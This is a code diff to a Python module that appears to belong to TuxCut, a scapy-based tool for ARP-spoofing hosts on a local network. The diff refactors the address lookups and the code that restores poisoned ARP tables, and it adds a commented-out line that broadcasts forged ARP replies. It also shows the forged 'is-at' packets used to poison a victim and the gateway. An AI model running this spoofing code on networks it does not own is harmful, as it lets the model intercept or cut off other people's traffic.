@@ -1,11 +1,11 @@
 import os
+import sys
 import subprocess as sp
 import logging
 from scapy.all import *
 import netifaces
 
 
-# Logger Conf
 LOG_DIR = '/var/log/tuxcut'
 if not os.path.isdir(LOG_DIR):
     os.mkdir(LOG_DIR)
@@ -33,11 +33,14 @@ def get_hostname(ip):
     """
     use nslookup from dnsutils package to get hostname for an ip
     """
-    ans = sp.Popen(['nslookup', ip], stdout=sp.PIPE)
-    for line in ans.stdout:
-        line = line.decode('utf-8')
-        if 'name = ' in line:
-            return line.split(' ')[-1].strip('.\n')
+    try:
+        ans = sp.Popen(['nslookup', ip], stdout=sp.PIPE)
+        for line in ans.stdout:
+            line = line.decode('utf-8')
+            if 'name = ' in line:
+                return line.split(' ')[-1].strip('.\n')
+    except Exception as e:
+        logger.error(sys.exc_info()[1], exc_info=True)
 
 
 def get_default_gw():
@@ -71,11 +74,9 @@ def get_my(iface):
     find the IP and MAC  addressess for the given interface
     """
     my = dict()
-    get_addr = netifaces.ifaddresses(iface)
-    if netifaces.AF_INET in get_addr:
-        my['ip'] = get_addr[netifaces.AF_INET][0]['addr']   # netifaces.AF_INET=2
-        my['mac'] = get_addr[netifaces.AF_LINK][0]['addr']  # netifaces.AF_LINK=17
-        my['hostname'] = get_hostname(get_addr[netifaces.AF_INET][0]['addr'])
+    my['ip'] = get_if_addr(iface)
+    my['mac'] = get_if_hwaddr(iface)
+    my['hostname'] = get_hostname(get_if_addr(iface))
     return my
 
 
@@ -94,6 +95,7 @@ def arp_spoof(victim):
 
     if gw:
         print('####  Poisoning Host {}'.format(victim['ip']))
+        # sendp(Ether(dst="FF:FF:FF:FF:FF:FF") / ARP(op="is-at", psrc=victim['ip'], hwsrc=my['mac']), count=5)
         # Cheat the victim
         to_victim = ARP()
         to_victim.op = 2    # make packet 'is-at'
@@ -116,23 +118,23 @@ def arp_spoof(victim):
 
 def arp_unspoof(victim):
     gw = get_default_gw()
+    logger.info('Sending Correction packages for {}'.format(victim['ip']))
 
     # Fix  the victim arp table
-    pkt_1 = ARP()
-    pkt_1.op = 2
-    pkt_1.psrc = gw['ip']
-    pkt_1.hwsrc = gw['mac']
-    pkt_1.pdst = victim['ip']
-    pkt_1.hwdst = victim['mac']
+    to_victim = ARP()
+    to_victim.op = 2  # make packet 'is-at'
+    to_victim.psrc = gw['ip']
+    to_victim.hwsrc = gw['mac']
+    to_victim.pdst = victim['ip']
+    to_victim.hwdst = victim['mac']
 
-    # Fix  the gateway arptable
-    pkt_2 = ARP()
-    pkt_2.op = 2
-    pkt_2.psrc = victim['ip']
-    pkt_2.hwsrc = victim['mac']
-    pkt_2.pdst = gw['ip']
-    pkt_2.hwdst = gw['mac']
+    # Fix the gateway arp table
+    to_gw = ARP()
+    to_gw.op = 2  # make packet 'is-at'
+    to_gw.psrc = victim['ip']
+    to_gw.hwsrc = victim['mac']
+    to_gw.pdst = gw['ip']
+    to_gw.hwdst = gw['mac']
 
-    logger.info('Sending Correction packages to {}'.format(victim['ip']))
-    send(pkt_1, count=10)
-    send(pkt_2, count=10)
+    send(to_victim, count=10)
+    send(to_gw, count=10)
